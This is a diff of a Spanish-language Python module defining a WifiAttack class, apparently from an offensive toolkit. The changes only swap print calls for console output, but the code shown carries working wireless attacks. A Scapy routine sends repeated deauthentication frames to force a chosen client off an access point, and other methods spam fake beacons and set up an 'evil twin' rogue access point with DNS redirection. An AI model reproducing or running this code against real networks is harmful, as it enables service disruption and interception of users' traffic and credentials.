@@ -5,10 +5,7 @@ import time
 import subprocess
 import threading
 import sys
-
-# ==========================================
 # 🛡️ CAPA DE COMPATIBILIDAD (BYPASS)
-# ==========================================
 try:
     from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, RandMAC, Dot11Deauth
     ESPACIO_RADIO_DISPONIBLE = True
@@ -25,7 +22,6 @@ except ImportError:
     def RandMAC(): return "00:00:00:00:00:00"
     def sendp(*args, **kwargs): pass
 
-
 class WifiAttack:
     def __init__(self, sentinel):
         self.sentinel = sentinel
@@ -34,21 +30,16 @@ class WifiAttack:
         self.ataca_activo = False
 
         if not ESPACIO_RADIO_DISPONIBLE:
-            print(
-                "\033[1;33m[!] ADVERTENCIA: Scapy/Drivers no detectados. Modo SIMULACIÓN activo.\033[0m")
-
-    # ==========================================
+            self.sentinel.console.print("[yellow][!] Scapy/Drivers no detectados. Modo SIMULACIÓN activo.[/yellow]")
     # 📡 OPERACIONES DE INTERFERENCIA
-    # ==========================================
 
     def beacon_spam(self, ssid_base="ANUBIS_"):
         self.ataca_activo = True
 
         if not ESPACIO_RADIO_DISPONIBLE:
-            print(
-                f"[SIMULACIÓN] Generando tráfico Beacon falso para: {ssid_base}...")
+            self.sentinel.console.print(f"[dim][SIM] Generando tráfico Beacon falso para: {ssid_base}...[/dim]")
         else:
-            print(f"[*] Lanzando Beacon Spam real en {self.iface_mon}...")
+            self.sentinel.console.print(f"[cyan][*] Lanzando Beacon Spam real en {self.iface_mon}...[/cyan]")
 
         self.sentinel.reportes.registrar_evento(
             "WIFI", f"Iniciando Beacon Spam: {ssid_base}")
@@ -75,24 +66,20 @@ class WifiAttack:
 
     def deauth(self, target_mac, ap_mac):
         if not ESPACIO_RADIO_DISPONIBLE:
-            print(
-                f"[SIMULACIÓN] Enviando paquetes Deauth ficticios: {target_mac} -> {ap_mac}")
+            self.sentinel.console.print(f"[dim][SIM] Deauth ficticio: {target_mac} → {ap_mac}[/dim]")
             return
 
-        print(f"[*] Desautenticando {target_mac} de {ap_mac}...")
+        self.sentinel.console.print(f"[cyan][*] Desautenticando {target_mac} de {ap_mac}...[/cyan]")
         pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac,
                                addr3=ap_mac)/Dot11Deauth(reason=7)
         sendp(pkt, iface=self.iface_mon, count=100, inter=0.1, verbose=0)
         self.sentinel.reportes.registrar_evento(
             "WIFI", f"Deauth real enviado a {target_mac}")
-
-    # ==========================================
     # 🕷️ OPERACIÓN GEMELO MALVADO (EVIL TWIN)
-    # ==========================================
 
     def detener_servicios_conflicto(self):
         if sys.platform != "linux":
-            print("[SIMULACIÓN] Deteniendo servicios de red conflictivos...")
+            self.sentinel.console.print("[dim][SIM] Deteniendo servicios de red conflictivos...[/dim]")
             return
 
         subprocess.run(["sudo", "systemctl", "stop",
@@ -101,12 +88,11 @@ class WifiAttack:
 
     def crear_gemelo_malvado(self, ssid, canal=6):
         self.detener_servicios_conflicto()
-        print(f"\n[!] INICIANDO OPERACIÓN GEMELO MALVADO: {ssid}")
+        self.sentinel.console.print(f"\n[bold yellow][!] INICIANDO GEMELO MALVADO: {ssid}[/bold yellow]")
 
         if sys.platform != "linux":
-            print(
-                f"[SIMULACIÓN] Configurando AP Virtual '{ssid}' en canal {canal}...")
-            print("[SIMULACIÓN] Redirección DNS 192.168.1.1 configurada.")
+            self.sentinel.console.print(f"[dim][SIM] AP Virtual '{ssid}' en canal {canal}...[/dim]")
+            self.sentinel.console.print("[dim][SIM] Redirección DNS 192.168.1.1 configurada.[/dim]")
             return
 
         # --- Lógica de archivos de configuración (Solo Linux) ---
@@ -130,7 +116,7 @@ class WifiAttack:
 
     def detener_ataques(self):
         self.ataca_activo = False
-        print("[*] Abortando ataques y limpiando sistema...")
+        self.sentinel.console.print("[cyan][*] Abortando ataques y limpiando sistema...[/cyan]")
 
         if sys.platform == "linux":
             subprocess.run(
@@ -138,4 +124,4 @@ class WifiAttack:
             subprocess.run(["sudo", "systemctl", "start",
                            "NetworkManager"], check=False)
         else:
-            print("[SIMULACIÓN] Servicios restaurados.")
+            self.sentinel.console.print("[dim][SIM] Servicios restaurados.[/dim]")
